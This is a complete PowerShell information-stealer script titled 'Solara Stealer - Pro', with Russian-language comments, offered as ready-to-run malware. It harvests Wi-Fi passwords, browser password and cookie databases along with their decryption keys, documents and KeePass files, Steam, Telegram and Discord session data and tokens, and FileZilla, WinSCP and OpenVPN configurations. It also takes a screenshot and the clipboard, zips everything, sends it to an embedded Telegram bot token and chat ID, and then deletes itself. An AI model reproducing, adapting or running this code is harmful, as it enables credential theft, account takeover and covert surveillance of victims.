# =================================================================================================
# ||                                                                                             ||
# ||                                  SOLARA STEALER - PRO                                      ||
# ||                                                                                             ||
# ||      Расширенная версия скрипта для сбора данных и отправки в Telegram.                   ||
# ||                Поддержка расширенного списка браузеров и ПО.                               ||
# ||                                                                                             ||
# =================================================================================================

# -------------------------------------------------------------------------------------------------
# |                                         КОНФИГУРАЦИЯ                                        |
# -------------------------------------------------------------------------------------------------

# --- Конфигурация Telegram ---
$TelegramToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
$ChatID = "1266539824"

# --- Настройки сбора данных ---
$StealBrowserData = $true      # Включает кражу паролей, cookie, истории, автозаполнения
$StealFiles = $true
$StealSystemInfo = $true
$StealGamingSessions = $true
$StealMessengerLogs = $true
$StealSessionsAndTokens = $true
$TakeScreenshot = $true
$GrabClipboard = $true
$StealVpnFtp = $true

# --- Настройки обфускации и очистки ---
$SelfDelete = $true # Удалить скрипт после выполнения

# --- Текстовые сообщения для вывода в консоль (можно легко изменить) ---
$OutputMessages = @{
    Start = "Запуск профессионального модуля сбора данных..."
    SystemInfo = "[+] Сбор информации о системе и сети..."
    BrowserSearch = "[+] Поиск установленных браузеров..."
    BrowserData = "[+] Извлечение файлов сессий, паролей и cookies для оффлайн-анализа..."
    Files = "[+] Поиск и копирование файлов (doc, txt, xls)..."
    Gaming = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
    Messengers = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
    Tokens = "[+] Поиск токенов авторизации..."
    Screenshot = "[+] Создание скриншота экрана..."
    Clipboard = "[+] Копирование данных из буфера обмена..."
    VpnFtp = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
    Archiving = "[+] Архивирование данных..."
    Sending = "[+] Отправка архива в Telegram..."
    Cleaning = "[+] Очистка следов..."
    Complete = "Процесс завершен."
}

# -------------------------------------------------------------------------------------------------
# |                                    ИСПОЛНЯЕМЫЙ КОД (НЕ ТРОГАТЬ)                            |
# -------------------------------------------------------------------------------------------------

function Start-Stealer {
    $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
    if (-not (Test-Path $LogFolder)) {
        New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null
    }

    Write-Host $OutputMessages.Start -ForegroundColor Yellow

    try {
        if ($StealSystemInfo) {
            Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan
            Get-SystemInformation -LogPath $LogFolder
        }
        if ($TakeScreenshot) {
            Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan
            Get-Screenshot -LogPath $LogFolder
        }
        if ($GrabClipboard) {
            Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan
            Get-ClipboardData -LogPath $LogFolder
        }
        if ($StealBrowserData) {
            Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan
            $BrowserProfiles = Find-AllBrowserProfiles
            if ($null -ne $BrowserProfiles) {
                Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan
                Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData"
            }
        }
        if ($StealFiles) {
            Write-Host $OutputMessages.Files -ForegroundColor Cyan
            Copy-UserFiles -LogPath "$LogFolder\Files"
        }
        if ($StealGamingSessions) {
            Write-Host $OutputMessages.Gaming -ForegroundColor Cyan
            Get-GamingData -LogPath "$LogFolder\Gaming"
        }
        if ($StealMessengerLogs) {
            Write-Host $OutputMessages.Messengers -ForegroundColor Cyan
            Get-MessengerData -LogPath "$LogFolder\Messengers"
        }
        if ($StealSessionsAndTokens) {
            Write-Host $OutputMessages.Tokens -ForegroundColor Cyan
            Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles
        }
        if ($StealVpnFtp) {
            Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
            Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
        }

        $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
        Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
        Compress-Archive -Path "$LogFolder\*" -DestinationPath $ZipPath -Force

        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
        Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
    }
    catch {
        Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        Write-Host $OutputMessages.Cleaning -ForegroundColor Yellow
        Remove-Item -Path $LogFolder -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
        if ($SelfDelete) {
            $scriptPath = $MyInvocation.MyCommand.Path
            if ($scriptPath -and (Test-Path $scriptPath)) {
                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
            }
        }
        Write-Host $OutputMessages.Complete -ForegroundColor Green
    }
}

# --- Функции сбора данных ---

function Get-SystemInformation {
    param($LogPath)
    $SysInfoPath = "$LogPath\SystemInfo.txt"
    try {
        $info = Get-ComputerInfo | Select-Object *
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
        $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip" -TimeoutSec 5

        "Date: $(Get-Date)" | Out-File $SysInfoPath -Append -Encoding utf8
        "Username: $env:USERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
        "Computer Name: $env:COMPUTERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
        "IP Address: $ip" | Out-File $SysInfoPath -Append -Encoding utf8
        "Location: $($geo.city), $($geo.country)" | Out-File $SysInfoPath -Append -Encoding utf8
        "OS: $($info.OsName)" | Out-File $SysInfoPath -Append -Encoding utf8
        "CPU: $($info.CsProcessors.Name[0])" | Out-File $SysInfoPath -Append -Encoding utf8
        "RAM: $([math]::Round($info.OsTotalVisibleMemorySize / 1MB)) MB" | Out-File $SysInfoPath -Append -Encoding utf8
        
        "--- Network ---" | Out-File $SysInfoPath -Append -Encoding utf8
        (netsh wlan show profiles) | ForEach-Object {
            if ($_ -match 'All User Profile\s+:\s(.*)') {
                $ssid = $matches[1].Trim()
                $key = (netsh wlan show profile name="$ssid" key=clear | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s', ''
                "Wi-Fi: $ssid | Password: $key" | Out-File $SysInfoPath -Append -Encoding utf8
            }
        }
        
        "--- Installed Programs ---" | Out-File $SysInfoPath -Append -Encoding utf8
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table | Out-File $SysInfoPath -Append -Encoding utf8
    } catch {
        "Failed to get full system info: $($_.Exception.Message)" | Out-File $SysInfoPath -Append -Encoding utf8
    }
}

function Get-Screenshot {
    param($LogPath)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        $bitmap.Save("$LogPath\Screenshot.png")
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

function Get-ClipboardData {
    param($LogPath)
    try {
        Add-Type -AssemblyName PresentationCore
        if ([System.Windows.Clipboard]::ContainsText()) {
            [System.Windows.Clipboard]::GetText() | Out-File "$LogPath\Clipboard.txt" -Encoding utf8
        }
    } catch {}
}

function Find-AllBrowserProfiles {
    $profiles = @{}
    $basePaths = @(
        "$env:LOCALAPPDATA",
        "$env:APPDATA"
    )
    $browserData = @{
        'Google\Chrome' = 'Chrome';
        'Google\Chrome Beta' = 'Chrome Beta';
        'Chromium' = 'Chromium';
        'Microsoft\Edge' = 'Edge';
        'BraveSoftware\Brave-Browser' = 'Brave';
        'Yandex\YandexBrowser' = 'Yandex';
        'Vivaldi' = 'Vivaldi';
        'Opera Software\Opera Stable' = 'Opera';
        'Opera Software\Opera GX Stable' = 'Opera GX';
        'Comet' = 'Comet';
        'Orbitum' = 'Orbitum';
        'Amigo' = 'Amigo';
        'Torch' = 'Torch';
        'SunBrowser' = 'SunBrowser';
        'Thorium' = 'Thorium';
        'UCBrowser' = 'UC Browser';
        'Mozilla\Firefox' = 'Firefox';
        'Waterfox' = 'Waterfox';
        'Tor Browser' = 'Tor Browser';
    }

    foreach ($base in $basePaths) {
        foreach ($path in $browserData.Keys) {
            $fullPath = Join-Path -Path $base -ChildPath $path
            if (Test-Path $fullPath) {
                if ($profiles.ContainsKey($browserData[$path])) {
                    $profiles[$browserData[$path]] += $fullPath
                } else {
                    $profiles[$browserData[$path]] = @($fullPath)
                }
            }
        }
    }
    return $profiles
}

function Get-BrowserFiles {
    param ($BrowserProfiles, $LogPath)
    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    
    $filesToGrab = @(
        'Login Data',        # Chromium passwords
        'Cookies',           # Chromium cookies
        'Web Data',          # Chromium autofill
        'History',           # Chromium history
        'Local State',       # Chromium decryption key
        'key4.db', 'key3.db', # Firefox decryption keys
        'logins.json',       # Firefox passwords
        'cookies.sqlite'     # Firefox cookies
    )

    foreach ($browserName in $BrowserProfiles.Keys) {
        $browserLogPath = Join-Path -Path $LogPath -ChildPath $browserName
        New-Item -Path $browserLogPath -ItemType Directory -Force | Out-Null
        
        foreach ($profilePath in $BrowserProfiles[$browserName]) {
            # Chromium-based
            Get-ChildItem -Path $profilePath -Directory -Filter "*User Data*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
                foreach($file in $filesToGrab) {
                    $filePath = Join-Path $_.FullName $file
                    if(Test-Path $filePath) {
                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
                    }
                }
            }
            # Firefox-based
            Get-ChildItem -Path $profilePath -Directory -Filter "*.default*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
                foreach($file in $filesToGrab) {
                    $filePath = Join-Path $_.FullName $file
                    if(Test-Path $filePath) {
                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
    }
    "Files for offline decryption have been collected." | Out-File "$LogPath\readme.txt"
}

function Copy-UserFiles {
    param($LogPath)
    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    $locations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    $extensions = @("*.doc*", "*.xls*", "*.txt", "*.pdf", "*.rtf", "*.kdbx")
    foreach ($loc in $locations) {
        Get-ChildItem -Path $loc -Include $extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            $targetDir = Join-Path -Path $LogPath -ChildPath ($_.Directory.Name)
            if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }
            Copy-Item $_.FullName -Destination $targetDir -Force
        }
    }
}

function Get-GamingData {
    param($LogPath)
    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    # Steam
    try {
        $steamPath = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "SteamPath" -ErrorAction SilentlyContinue).SteamPath
        if ($steamPath) {
            $steamLogPath = Join-Path $LogPath "Steam"
            New-Item -Path $steamLogPath -ItemType Directory -Force | Out-Null
            Copy-Item -Path "$steamPath\config" -Destination $steamLogPath -Recurse -Force
            Get-ChildItem -Path $steamPath -Filter "ssfn*" -File | Copy-Item -Destination $steamLogPath -Force
        }
    } catch {}
    # Epic Games
    try {
        $epicPath = "$env:LOCALAPPDATA\EpicGamesLauncher\Saved\Config\Windows"
        if (Test-Path $epicPath) {
            Copy-Item -Path $epicPath -Destination (Join-Path $LogPath "EpicGames") -Recurse -Force
        }
    } catch {}
}

function Get-MessengerData {
    param($LogPath)
    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    
    # Telegram - ИСПРАВЛЕНО: используем -Exclude вместо -Filter
    try {
        $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
        if (Test-Path $tgPath) {
            Copy-Item -Path $tgPath `
                -Destination (Join-Path $LogPath "Telegram") `
                -Recurse -Force `
                -Exclude "user_data*", "cache*" `
                -ErrorAction SilentlyContinue
        }
    } catch {}
    
    # Discord
    $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
    foreach ($path in $discordPaths) {
        $storagePath = Join-Path $path "Local Storage\leveldb"
        if (Test-Path $storagePath) {
            Copy-Item -Path $storagePath -Destination (Join-Path $LogPath "Discord\$($path | Split-Path -Leaf)") -Recurse -Force
        }
    }
}

function Get-Tokens {
    param($LogPath, $BrowserProfiles)
    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    $searchPaths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb")
    foreach ($browser in $BrowserProfiles.Keys) {
        if ($browser -notlike "*Firefox*") { # Regex on ldb files is mainly for Chromium
            foreach ($profilePath in $BrowserProfiles[$browser]) {
                $searchPaths += Join-Path $profilePath "Local Storage\leveldb"
            }
        }
    }

    $regex = '([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})'
    $foundTokens = New-Object System.Collections.Generic.HashSet[string]
    
    foreach($path in ($searchPaths | Get-Unique)){
        if(Test-Path $path){
            Get-ChildItem $path -Filter "*.ldb" -File -ErrorAction SilentlyContinue | ForEach-Object {
                (Get-Content $_.FullName -Raw -Encoding Default -ErrorAction SilentlyContinue) | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                    $_.Matches | ForEach-Object { $foundTokens.Add($_.Value) }
                }
            }
        }
    }
    $foundTokens | Out-File "$LogPath\Tokens.txt"
}

function Get-VpnFtpData {
    param($LogPath)
    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    # FileZilla
    try {
        $filezillaPath = "$env:APPDATA\FileZilla"
        if (Test-Path $filezillaPath) {
            Copy-Item -Path $filezillaPath -Destination (Join-Path $LogPath "FileZilla") -Recurse -Force
        }
    } catch {}
    # WinSCP
    try {
        $winscpPath = "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions"
        if(Test-Path $winscpPath) {
            Get-Item -Path $winscpPath | Select-Object -ExpandProperty Property | ForEach-Object {
                $session = Get-ItemProperty -Path "$winscpPath\$_"
                "Session: $_ | Host: $($session.HostName) | User: $($session.UserName)" | Out-File -FilePath "$LogPath\WinSCP.txt" -Append
            }
        }
    } catch {}
    # OpenVPN
    try {
        $openVpnPath = "$env:USERPROFILE\OpenVPN\config"
        if (Test-Path $openVpnPath) {
            Copy-Item -Path $openVpnPath -Destination (Join-Path $LogPath "OpenVPN") -Recurse -Force
        }
    } catch {}
}

function Send-TelegramFile {
    param($FilePath, $Caption)
    $uri = "https://api.telegram.org/bot$TelegramToken/sendDocument"

    try {
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = Split-Path -Leaf $FilePath

        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @()
        $body += "--$boundary"
        $body += "Content-Disposition: form-data; name=`"chat_id`""
        $body += ""
        $body += $ChatID
        $body += "--$boundary"
        $body += "Content-Disposition: form-data; name=`"caption`""
        $body += ""
        $body += $Caption
        $body += "--$boundary"
        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
        $body += "Content-Type: application/zip"
        $body += ""

        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(($body -join "`r`n"))
        $boundaryBytes = [System.Text.Encoding]::UTF8.GetBytes("--$boundary--`r`n")

        $requestBody = New-Object System.IO.MemoryStream
        $requestBody.Write($bodyBytes, 0, $bodyBytes.Length)
        $requestBody.Write($fileContent, 0, $fileContent.Length)
        $requestBody.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"), 0, 2)
        $requestBody.Write($boundaryBytes, 0, $boundaryBytes.Length)

        Invoke-RestMethod -Method Post -Uri $uri `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $requestBody.ToArray() `
            -TimeoutSec 120
    } catch {
        Write-Warning "Failed to send file to Telegram: $($_.Exception.Message)"
    }
}

# --- Запуск основной функции ---
Start-Stealer
